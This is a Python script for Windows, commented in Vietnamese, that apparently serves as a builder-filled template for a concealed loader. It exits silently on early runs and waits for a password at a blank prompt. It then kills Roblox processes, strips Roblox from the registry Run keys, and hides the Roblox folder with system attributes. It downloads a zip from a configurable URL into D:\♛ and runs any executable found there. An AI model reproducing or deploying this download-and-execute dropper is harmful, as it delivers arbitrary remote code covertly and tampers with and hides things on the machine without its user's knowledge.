import os
import sys
import time
import requests
import zipfile
import subprocess
import winreg
import getpass

# CẤU HÌNH ĐƯỢC WEB THAY THẾ TỰ ĐỘNG
CONFIG_PASSWORD = "MA_MAT_KHAU_CUA_BAN"
DOWNLOAD_LINK = "LINK_DOWNLOAD_FILE_CUA_BAN"
MAX_LOOP = 5

FOLDER_PATH = r"D:\♛"
COUNTER_FILE = os.path.join(os.getenv('TEMP'), "app_loop_counter.txt")

def handle_loop():
    """Xử lý đếm số lần loop trước khi mở thật"""
    count = 0
    if os.path.exists(COUNTER_FILE):
        try:
            with open(COUNTER_FILE, "r") as f:
                count = int(f.read().strip())
        except:
            count = 0
    
    if count < MAX_LOOP - 1:
        count += 1
        with open(COUNTER_FILE, "w") as f:
            f.write(str(count))
        sys.exit(0)
    else:
        if os.path.exists(COUNTER_FILE):
            os.remove(COUNTER_FILE)

def disable_roblox_startup_and_search():
    """Tắt và loại bỏ Roblox khỏi Startup/Search/Indexing"""
    username = getpass.getuser()
    
    # 1. Kill tiến trình đang chạy
    subprocess.run("taskkill /F /IM RobloxPlayerBeta.exe /T", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    subprocess.run("taskkill /F /IM RobloxStudioInstaller.exe /T", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    # 2. Xóa khỏi Startup Registry
    startup_keys = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
    ]
    
    for root, key_path in startup_keys:
        try:
            with winreg.OpenKey(root, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                i = 0
                while True:
                    try:
                        val_name, val_data, _ = winreg.EnumValue(key, i)
                        if "roblox" in val_name.lower() or "roblox" in str(val_data).lower():
                            winreg.DeleteValue(key, val_name)
                        else:
                            i += 1
                    except OSError:
                        break
        except Exception:
            pass

    # 3. Ẩn thư mục Roblox để tránh Windows Search/Index tìm thấy
    roblox_dir = rf"C:\Users\{username}\AppData\Local\Roblox"
    if os.path.exists(roblox_dir):
        try:
            subprocess.run(f'attrib +h +s "{roblox_dir}" /s /d', shell=True)
        except:
            pass

def download_and_extract(url, target_folder):
    """Tải và giải nén file vào D:\♛"""
    os.makedirs(target_folder, exist_ok=True)
    file_path = os.path.join(target_folder, "downloaded_data.zip")
    
    try:
        res = requests.get(url, stream=True, timeout=30)
        if res.status_code == 200:
            with open(file_path, 'wb') as f:
                for chunk in res.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            
            if zipfile.is_zipfile(file_path):
                with zipfile.ZipFile(file_path, 'r') as zip_ref:
                    zip_ref.extractall(target_folder)
                os.remove(file_path)
            return True
    except Exception as e:
        print(f"Lỗi tải file: {e}")
    return False

def run_exe_in_folder(folder_path):
    """Chạy file .exe bất kỳ trong D:\♛"""
    for file in os.listdir(folder_path):
        if file.endswith(".exe"):
            full_exe_path = os.path.join(folder_path, file)
            subprocess.Popen([full_exe_path], cwd=folder_path)
            break

def main():
    # 1. Kiểm tra tính năng Loop
    handle_loop()

    # 2. Chờ nhập mật khẩu (Màn hình trống hoàn toàn không hiện chữ)
    entered_pw = input("")
    
    if entered_pw.strip() != CONFIG_PASSWORD:
        sys.exit(0)  # Mật khẩu sai -> Thoát ngay

    # 3. Tắt Roblox Startup & Index
    disable_roblox_startup_and_search()

    # 4. Kiểm tra thư mục D:\♛
    if not os.path.exists(FOLDER_PATH) or len(os.listdir(FOLDER_PATH)) == 0:
        # Nếu chưa có thư mục hoặc trống -> Tạo & Tải file -> Tự đóng
        if download_and_extract(DOWNLOAD_LINK, FOLDER_PATH):
            sys.exit(0)
    else:
        # Nếu đã có thư mục ♛ -> Chạy file .exe bên trong -> Tự đóng
        run_exe_in_folder(FOLDER_PATH)
        sys.exit(0)

if __name__ == "__main__":
    main()
